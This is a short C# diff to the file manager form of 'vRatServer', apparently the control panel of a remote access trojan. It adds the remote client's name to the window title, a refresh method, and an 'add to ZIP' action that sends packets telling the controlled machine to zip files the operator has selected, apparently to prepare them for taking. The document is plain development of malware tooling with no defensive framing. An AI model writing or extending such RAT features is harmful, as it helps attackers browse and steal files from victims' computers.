@@ -52,7 +52,7 @@ namespace vRatServer.Forms
 
         private void FileManager_Load(object sender, EventArgs e)
         {
-
+            this.Text = this.Text + "  - " + client.Name;
             DownloadFile.fileid = 0;
             client.fmf = this;
             byte[] r = null;
@@ -76,6 +76,10 @@ namespace vRatServer.Forms
             
         }
 
+        public void refresFileList()
+        {
+            textBox1_TextChanged(null, EventArgs.Empty);
+        }
         private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
         {
 
@@ -202,6 +206,21 @@ namespace vRatServer.Forms
             }
 
 
+
+        }
+
+        private void addToZIPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var t = FilesList.SelectedItems;
+            if (t.Count == 0) { return; }
+            foreach (ListViewItem i in t)
+            {
+                string fullpath = textBox1.Text + "\\" + i.Text;
+                byte[] rpath = Encoding.Unicode.GetBytes(fullpath);
+                byte[] concatenatedArray1 = rpath.Concat(new byte[] { 0x00, 0x00 }).ToArray();
+                globals.SendPacket(client, (byte)globals.PacketType.zip, rpath.Length + 2, 0, ref concatenatedArray1);
+            }
+            MessageBox.Show("Zipping in progress...", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
         }
     }
